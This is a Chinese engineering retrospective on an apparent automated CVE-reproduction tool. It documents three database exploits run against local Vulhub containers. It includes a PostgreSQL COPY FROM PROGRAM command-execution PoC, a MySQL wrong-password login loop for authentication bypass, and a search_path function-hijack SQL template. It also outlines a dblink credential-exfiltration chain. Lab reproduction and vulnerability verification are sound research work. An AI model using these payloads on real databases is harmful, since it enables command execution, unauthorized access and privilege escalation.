# 数据库非 HTTP 成功案例思路盘点

生成日期：2026-07-20  
范围：CVE Hunter 数据库优先非 HTTP 路径的 3 个端到端成功案例  
状态口径：`status_code=数据库命中`，`success_tier=可复现归档`，`repro.complete=true`

---

## 0. 总览：我们在解决什么问题

### 0.1 背景矛盾

项目原主路径是 **HTTP 发包 + 抓包 + IPS 命中**。但大量真实漏洞是：

- 数据库协议（MySQL/PostgreSQL）
- 需要 SQL / 鉴权 / 多角色，而不是 `GET /`
- 以前会被粗暴标成 `NOT_HTTP_VULN` / `非HTTP漏洞` 直接放弃

### 0.2 设计原则（贯穿三个案例）

1. **不假装支持**：非 DB 的 kernel/tcp 等只回「协议未支持」接口。
2. **优先真实 CVE 编号 + Vulhub 本地环境**，而不是只做执行器 demo。
3. **候选可抽取、可执行、可判定、可归档**：
   - 抽取 → `execution_spec`
   - 执行 → database executor
   - 判定 → oracle（中文状态码）
   - 归档 → `output/<CVE>/repro/`
4. **环境坑要自动化处理**：端口占用、CRLF、凭证、DSN 补全。
5. **oracle 宁简勿假**：能证明“目标侧利用效果”即可；不必为了完整攻击链拖垮自动化。

### 0.3 成功矩阵

| CVE | 产品 | 漏洞形态 | 执行 action | 关键证据 |
|---|---|---|---|---|
| CVE-2019-9193 | PostgreSQL 10.7 | 超户 `COPY ... PROGRAM` 命令执行 | 单会话 SQL | `uid=999(postgres)...` |
| CVE-2012-2122 | MySQL 5.5.23 | 错误密码反复登录鉴权绕过 | `auth_bypass` | 第 258 次登录成功 |
| CVE-2018-1058 | PostgreSQL 9.6.7 | search_path 提权（简化） | `multi_session` | marker=`cve-2018-1058-triggered` |

三者在批测历史中都曾失败：

| CVE | 历史失败码 | 历史含义 |
|---|---|---|
| 2012-2122 | `NOT_HTTP_VULN` | 非 HTTP 直接不支持 |
| 2018-1058 | `NVD_REQUEST_FAILED` | 情报/代理失败，未进入利用 |
| 2019-9193 | `WEB_SEARCH_FAILED` | 搜索失败导致无候选（代理问题） |

---

## 1. 通用技术架构（思考 → 落地）

### 1.1 思考路径

```text
漏洞是不是 HTTP？
  ├─ 是 → 旧 HTTP 路径
  └─ 否 → 是否像数据库？
        ├─ 是 → 抽 execution_spec → 起本地 compose → 执行 → oracle → repro
        └─ 否 → 协议未支持（接口保留，不硬撑）
```

### 1.2 关键模块

| 模块 | 职责 |
|---|---|
| `cve_hunter/tools/db_spec.py` | 从 README/compose/init 抽取 execution_spec、凭证、多会话 |
| `cve_hunter/tools/local_kb.py` | Vulhub/本地 KB 命中并返回 raw_http 或 execution_spec |
| `cve_hunter/executors/database.py` | 单会话 SQL / auth_bypass / multi_session |
| `cve_hunter/executors/base.py` | 协议分发与 spec 结构 |
| `cve_hunter/agents.py` | compose 启动、端口重映射、sh CRLF 修复、TCP 健康检查 |
| `cve_hunter/graph.py` | 路由：database 不走「非HTTP直接结束」；环境 host 写回 DSN |
| `cve_hunter/evidence.py` | success_tier / failure_class / repro / version_evidence |
| `main.py --stats` | 中文状态码、失败归因、成功层级、协议分布 |

### 1.3 统一产物

```text
output/<CVE>/
  result.json
  repro/
    manifest.json          # 中文 status / tier / failure_class
    environment.json
    teardown.json
    replay.md
    trigger/execution_spec.json
    evidence/
      oracle.json
      executor.json
      version_evidence.json   # claimed/verified 轻量证据链
```

### 1.4 版本证据（轻量 claimed/verified）

不是完整 vulnerable/fixed A/B 对照，而是：

- **claimed**：NVD 描述启发式抽取版本区间（如 `9.3-11.2`、`<5.5.24`）
- **verified**：compose 镜像标签 + 运行输出中的版本线索（如 `image:vulhub/postgres:10.7`）

当前三个案例均为 `claimed_and_verified`。

### 1.5 数据库路径 TCP 抓包（2026-07-20 补齐）

**问题**：三个成功案例最初没有 pcap，因为 DB 走 Python 驱动直连，不经 http2pcap。

**方案**：

```text
execute_database_spec
  → start dumpcap (Loopback + tcp port <db>)
  → 执行 SQL / auth_bypass / multi_session
  → stop dumpcap
  → pcap_file_path 写入 executor 结果
  → graph finalize_capture(keep=oracle成功)
  → repro/evidence 复制 pcap
```

**配置**：`DB_TCP_CAPTURE_ENABLED`（默认 local_lab 开）、`DUMPCAP_PATH`、`CAPTURE_INTERFACE`。  
**代码**：`cve_hunter/tools/tcp_capture.py`（候选网卡并行 dumpcap，保留包数最多的文件）。  
**说明**：pcap 是流量证据；成功判定仍以数据库 oracle 为准。无 dumpcap 时降级，不阻断复现。  
**验收（2026-07-20）**：CVE-2019-9193 复跑成功后本地保存非空 pcap（约 33 packets / 2.9KB），并进入 `repro/evidence/`。

---

## 2. 案例一：CVE-2019-9193（PostgreSQL 命令执行）

### 2.1 漏洞直觉

- 名称层面：`COPY TO/FROM PROGRAM` 允许在服务端 OS 用户上下文执行命令。
- 前置：通常需要超级用户或 `pg_execute_server_program`。
- Vulhub 默认 `postgres/postgres`，版本 `10.7`，正好落在受影响区间。
- 这是**单连接、纯 SQL、结果可直接读出**的理想自动化样本。

### 2.2 攻击 / 复现思路

经典 PoC：

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

判定：查询结果包含 `uid=`。

为什么这是好的 oracle：

- 不是“SQL 不报错就算成功”
- 而是**命令执行输出回表**，目标侧证据硬

### 2.3 实现思考过程

1. **先问：README 里有没有可机读 SQL？**  
   有，且带 ` ```sql ` 围栏 → `extract_sql_statements` 可抽。

2. **SQL 如何分段？**  
   - `DROP/CREATE` → schema  
   - `COPY/SELECT` → trigger  
   - `DROP` 同时记 cleanup  

3. **engine/DSN 怎么来？**  
   - 路径含 `postgres` → engine=postgres  
   - 文档账号 `postgres/postgres`  
   - 环境 `tcp://127.0.0.1:5432` 覆盖 host/port → `postgres://postgres:postgres@127.0.0.1:5432/postgres`

4. **健康检查不能走 HTTP**  
   5432 当 HTTP 会假失败 → TCP healthcheck。

5. **连接时机**  
   compose up 后端口开了但 DBMS 未必 ready → 连接短重试。

6. **oracle**  
   检测 `FROM PROGRAM` / `COPY` → `result_contains: uid=`。

### 2.4 实现映射

| 步骤 | 代码/行为 |
|---|---|
| 本地 KB 命中 | `search_local_kb` → `local_kb_vulhub_sql` |
| 抽取 | `extract_database_execution_spec` |
| 起环境 | vulhub `postgres/CVE-2019-9193`，镜像 `vulhub/postgres:10.7` |
| 执行 | `execute_database_spec` 顺序跑 schema/trigger |
| 判定 | oracle `result_contains=uid=` |
| 归档 | repro complete，tier=可复现归档 |

### 2.5 端到端证据摘要

- 状态：`SUCCESS` / `数据库命中`
- 证据：`uid=999(postgres) gid=999(postgres)...`
- 版本：claimed `9.3-11.2`，verified `image:vulhub/postgres:10.7`

### 2.6 复盘：为什么它先成功

- SQL 自包含
- 单角色
- oracle 天然强
- 无端口冲突、无 CRLF 脚本依赖

它成为数据库 MVP 的“黄金样本”，用来验证整条链路是否通。

---

## 3. 案例二：CVE-2012-2122（MySQL 鉴权绕过）

### 3.1 漏洞直觉

- 不是 SQL 注入，而是**认证比较缺陷**（特定 `memcmp` 实现下错误密码也可能偶发通过）。
- README 的复现是 bash 循环，不是 SQL：

```bash
for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done
```

- 若仍坚持“只抽 SQL”，会得到 **无 execution_spec**，历史批测就卡在 `NOT_HTTP_VULN`。

### 3.2 攻击 / 复现思路

1. 只知道用户名（`root`），用**固定错误密码**反复尝试登录。
2. 成功标志：某次连接真正建立，并可执行 `SELECT USER()`。
3. 概率性：通常数百次内命中（本机实测约第 258 次）。

自动化关键不是“会不会写循环”，而是：

- 如何从文档识别这是 auth_bypass 而不是普通 MySQL
- 如何把“连接成功本身”做成 oracle
- 如何处理本机 3306 已被 `mysqld.exe` 占用

### 3.3 实现思考过程

#### 思考 A：抽取层

信号：

- 标题/正文：`身份认证绕过` / `authentication bypass` / `memcmp`
- 命令：`mysql -uroot -pwrong`
- 循环：`seq 1 1000`

→ 新增 `_infer_auth_bypass`：

```text
action = auth_bypass
auth_bypass = {username, wrong_password, max_attempts}
oracle.type = auth_success
trigger_sql = [SELECT USER(); SELECT VERSION();]  # 登录成功后的弱确认
```

#### 思考 B：执行层

不能走“先正确密码连上再跑 SQL”，因为漏洞本身就在**错误密码登录**。

→ `_execute_auth_bypass`：

1. 区分「目标宕机」与「认证失败」  
   - connection refused / timeout → 目标不可达  
   - Access denied → 继续尝试
2. 循环错误密码连接，成功后跑无害 SELECT 补证据
3. 返回 `auth_bypass_success attempt=N user=root`

#### 思考 C：环境层（关键坑）

首次 E2E 失败：`bind 0.0.0.0:3306` 被本机 MySQL 占用。

思考：

- 不要求用户停掉系统 MySQL
- compose 声明的 host port 被占用时，**自动改映到空闲端口**

→ `_compose_with_free_host_ports`：

- 写临时 yml（同目录，volume 相对路径仍有效）
- `3306:3306` → `27825:3306`
- target 变为 `tcp://127.0.0.1:27825`
- graph 回写 DSN host/port

### 3.4 实现映射

| 步骤 | 代码/行为 |
|---|---|
| 识别无 SQL 的 DB 漏洞 | `_infer_auth_bypass` |
| 起环境 | vulhub mysql 5.5.23 + 端口重映射 |
| 执行 | 错误密码循环登录 |
| oracle | `auth_success` |
| 证据 | `attempt=258` + `root@...` |

### 3.5 端到端证据摘要

- 状态：`SUCCESS` / `数据库命中`
- 证据：`auth_bypass_success attempt=258 user=root; rows=[['root@172.25.0.1']]`
- 环境：`port_remap: 3306→27825`
- 版本：claimed `<5.1.63/<5.5.24/<5.6.6`，verified `image:vulhub/mysql:5.5.23`

### 3.6 复盘：从“非 HTTP 不支持”到闭环

| 旧世界 | 新世界 |
|---|---|
| 非 HTTP → 结束 | 非 HTTP 但 database → 继续 |
| 只会抽 SQL | 会识别 auth_bypass |
| 假定 3306 空闲 | 自动改端口 |
| 没有目标侧 oracle | 登录成功 + 查询即证据 |

---

## 4. 案例三：CVE-2018-1058（PostgreSQL search_path 提权）

### 4.1 漏洞直觉

- 低权限用户可在 `public` 等 schema 创建与系统函数同名的对象。
- 若超级用户在不安全的 `search_path` 下调用未限定 schema 的函数名，可能执行攻击者对象。
- Vulhub 文档完整利用是：
  1. 普通用户 `vulhub/vulhub` 植入恶意 `public.array_to_string`
  2. 函数体内 `dblink_connect` 外连攻击者，带出 `pg_shadow` 密码
  3. 超户 `pg_dump` 触发

这是**多角色 + 外连 + 容器内命令**的复合链，单会话 SQL MVP 直接不够。

### 4.2 攻击 / 复现思路：完整版 vs 简化版

#### 完整版（文档原意）

```text
attacker@vulhub → CREATE FUNCTION public.array_to_string ... dblink_connect(外连)
attacker 监听 5433
superuser pg_dump → 触发后门 → 收到 postgres 密码哈希
```

难点：

- 需要额外 listener
- dblink 目标地址在容器网络视角下不好自动化
- `pg_dump` 实际大量使用 `pg_catalog.` 限定名，未必触发 public 覆盖

#### 简化版（本地可证伪/可证真）

手工实验结论：

1. 默认 `search_path="$user", public` 时，`array_to_string` 仍优先 `pg_catalog`，**不会中招**。
2. 显式 `SET search_path TO public, pg_catalog` 后，超户调用未限定名会执行 public 函数。
3. 因此可用 **marker 表**证明“超户确实执行了低权植入函数”：

```sql
-- attacker
CREATE TABLE marker(...);
CREATE FUNCTION public.array_to_string(...) AS $$
  INSERT INTO marker VALUES (999, 'cve-2018-1058-triggered');
  SELECT pg_catalog.array_to_string($1,$2);
$$;

-- superuser
SET search_path TO public, pg_catalog;
SELECT array_to_string(ARRAY['a','b'], ',');
SELECT * FROM marker;
```

oracle：结果包含 `cve-2018-1058-triggered`。

**诚实边界**：这证明了 search_path 劫持在目标环境可触发，不等于完整外连偷密链。蓝图中标记为简化闭环。

### 4.3 实现思考过程

#### 思考 A：为什么必须 multi_session

- 植入必须用低权账号（证明“普通用户能埋”）
- 触发必须用超户（证明“超户会误执行”）
- 同一 DSN 换用户不够清晰，于是 sessions 数组：

```json
"sessions": [
  {"name": "attacker", "user": "vulhub", "schema_sql": [...]},
  {"name": "superuser", "user": "postgres", "trigger_sql": [...], "cleanup_sql": [...]}
]
```

#### 思考 B：凭证从哪来

README 写 `vulhub:vulhub`，compose 写 `POSTGRES_PASSWORD=vulhub_secret`，init.sh 创建用户。

→ `extract_compose_db_credentials`：

- compose 环境变量
- init.sh `CREATE USER ... PASSWORD`

#### 思考 C：init.sh CRLF

Windows 检出导致：

```text
/docker-entrypoint-initdb.d/init.sh: line 2: $'\r': command not found
```

容器起不来，vulhub 用户也不存在。

→ compose 启动前 `_normalize_compose_shell_scripts`：`*.sh` CRLF→LF。

#### 思考 D：DSN 覆盖 bug

多会话共享 env_target 时，若 `resolve_database_target` 遇到完整 DSN 就原样返回，会把 attacker 也变成 postgres 账号。

→ 修复：DSN 输入时保留 host/port，允许 user/password/database 覆盖。

### 4.4 实现映射

| 步骤 | 代码/行为 |
|---|---|
| 识别 1058 / search_path 提权 | `_infer_search_path_multi_session` |
| 凭证 | compose + init.sh |
| 起环境 | vulhub postgres 9.6.7 + sh 规范化 |
| 执行 | `_execute_multi_session` |
| oracle | superuser 会话 `result_contains` marker |
| 清理 | 超户会话 drop function/table |

### 4.5 端到端证据摘要

- 状态：`SUCCESS` / `数据库命中`
- 证据：`[999, 'cve-2018-1058-triggered']`
- 版本：claimed `9.3-10`，verified `image:vulhub/postgres:9.6.7`

### 4.6 复盘：从“超出 MVP”到可归档

| 障碍 | 处理 |
|---|---|
| 多角色 | multi_session |
| 外连复杂 | 简化为 marker 证明触发 |
| 错误默认密码 | compose/init 凭证抽取 |
| Windows CRLF | 启动前转 LF |
| 会话 DSN 串号 | resolve_database_target 可覆盖账号 |

---

## 5. 横向对比：三个案例教会我们什么

### 5.1 抽取策略要分层

| 层 | 适用 | 例子 |
|---|---|---|
| SQL 围栏抽取 | 文档给完整 SQL | 9193 |
| 行为模式抽取 | 文档是 shell/叙事 | 2122 auth_bypass |
| 场景模板抽取 | 文档完整链太重，用等价可证模板 | 1058 multi_session |

### 5.2 执行器能力递进

```text
单会话 SQL
  → auth_bypass（连接即攻击）
  → multi_session（角色编排）
```

### 5.3 环境工程与漏洞利用同等重要

三个案例里真正“卡死自动化”的，往往不是 payload：

- 端口占用
- CRLF
- 错误默认密码
- 把 5432 当 HTTP 探活
- 代理关闭导致情报失败，但本地 KB 本可闭环

### 5.4 判定哲学

| 坏 oracle | 好 oracle |
|---|---|
| SQL 不报错 | 输出含 `uid=` |
| 端口通了 | 错误密码登录成功 |
| 函数创建成功 | 超户触发后 marker 出现 |

### 5.5 与批测历史的关系

这些不是“一直能过的老样本”，而是：

- 历史失败 / 不支持
- 能力补齐后首次或重新闭环
- 因此更适合作为数据库非 HTTP 能力的验收集

---

## 6. 推荐重放命令

```bash
# Windows 控制台建议
export PYTHONIOENCODING=utf-8
export PYTHONUTF8=1

python main.py CVE-2019-9193 --local-container
python main.py CVE-2012-2122 --local-container
python main.py CVE-2018-1058 --local-container

python main.py --stats
```

产物核对：

```text
output/<CVE>/repro/manifest.json
output/<CVE>/repro/evidence/oracle.json
output/<CVE>/repro/evidence/version_evidence.json
```

---

## 7. 后续方向（未做完的“大任务”）

1. **前置条件自动补齐**（登录/token/会话）—— HTTP 路径更急需，DB 路径已有账号模型可复用。  
2. **真正的 vulnerable/fixed 对照**：起两个版本镜像做差分，而不是只有 claimed/verified 线索。  
3. **1058 完整 dblink 外连链**（可选，增强真实性，非本地 marker）。  
4. **批测历史 JSON 落盘回填** success_tier/failure_class（当前 stats 读取时已可推断）。  

---

## 8. 一句话结论

数据库非 HTTP 路径能成立，靠的不是“多抓几个 PoC 链接”，而是：

> **把漏洞叙事编译成可执行的 execution_spec，把环境噪声自动化消掉，再用目标侧强 oracle 证明利用成立，并归档成可重放证据。**

三个案例分别打通了：

- 单会话命令执行（9193）
- 协议层鉴权绕过（2122）
- 多角色逻辑提权（1058）

形成从“不会做非 HTTP”到“数据库优先可闭环”的完整思路闭环。
